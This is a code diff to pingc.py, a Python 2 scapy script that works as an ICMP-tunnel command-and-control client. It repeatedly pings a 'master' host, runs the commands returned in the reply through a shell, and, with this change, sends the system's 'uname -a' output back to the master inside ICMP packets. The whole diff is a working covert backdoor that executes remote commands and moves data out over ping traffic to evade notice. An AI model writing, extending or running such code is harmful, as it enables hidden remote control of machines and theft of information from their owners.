@@ -8,8 +8,13 @@
 
 import sys
 import time
+import signal
 import subprocess as sub
 from scapy.all import sr,sr1,ICMP,IP
+
+def handler(signum, frame):
+        print 'Bye!'
+        sys.exit()
 
 def sendPingRequest(command):
 	packet=IP(dst=sys.argv[1])/ICMP()/command
@@ -32,10 +37,20 @@ def processReply(p):
                 command.split()
                 proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
-                print output
+		print output
                 print errors
 	elif 'sysinfo' in response:
         	print "[*] Master requesting sysinfo"
+		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
+                output, errors = proc.communicate()
+                p=sendPingRequest('sysinfo %s' % output)
+		if p:	
+			processReply(p)
+		print output
+                print errors
+	elif 'thanks' in response:
+		print "[*] Request received"
+		print "[*] Sleeping for 10"
         elif 'sleep' in response:
 		seconds = response[6:]
                 print "[*] Master says sleep for %s seconds" % (seconds)
@@ -45,13 +60,14 @@ def processReply(p):
                 processReply(p)
 
 def main(argv):
-	while 1:
+	while True:
 		if len(argv) < 1:
 			print "----------------------------"
 			print "PingC Usage"
 			print " ./pingc.py <IP>"
 			print "----------------------------"
 			exit()
+		signal.signal(signal.SIGINT, handler)
 		p=sendPingRequest("What shall I do master?")
 		if p:
 			processReply(p)
